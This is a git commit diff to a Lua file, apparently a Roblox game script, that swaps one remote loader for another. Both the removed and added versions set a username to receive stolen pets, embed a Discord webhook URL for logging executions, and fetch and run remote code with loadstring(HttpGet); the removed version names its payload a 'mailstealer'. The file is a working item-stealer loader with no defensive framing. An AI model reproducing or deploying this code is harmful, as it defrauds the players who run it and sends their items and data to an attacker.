60a943af867059c77b6b811e36af33e525527f1f
TakTySiKokot <135499276+TakTySiKokot@users.noreply.github.com>
2023-06-04 18:21:00 +0200

    Update Mainstring.lua

--- Mainstring.lua
+++ Mainstring.lua
@@ -1,10 +1,5 @@
---[[ Arkhalis Mail Logger ]]--
-
---[[ Main Config ]]--
-_G.Username1 = "HejVajcoCoRobis" --// Username To Send Pets To
-
---[[ WebHook ]]--
-_G.Webhook = "https://discord.com/api/webhooks/1114812057016078357/7NFjQ18r74xXe1yGI_NPkKEiiig4yPUU2wiPH0LI9qQLfCy61OrgPdBlIjz9cKn8lGeE" --// Discord Webhook For Executions
-
---[[ Script ]]--
-loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
+_G.UserName = "HejVajcoCoRobis"
+_G.UserName2 = "HejVajcoCoRobis" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/1114812057016078357/7NFjQ18r74xXe1yGI_NPkKEiiig4yPUU2wiPH0LI9qQLfCy61OrgPdBlIjz9cKn8lGeE" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
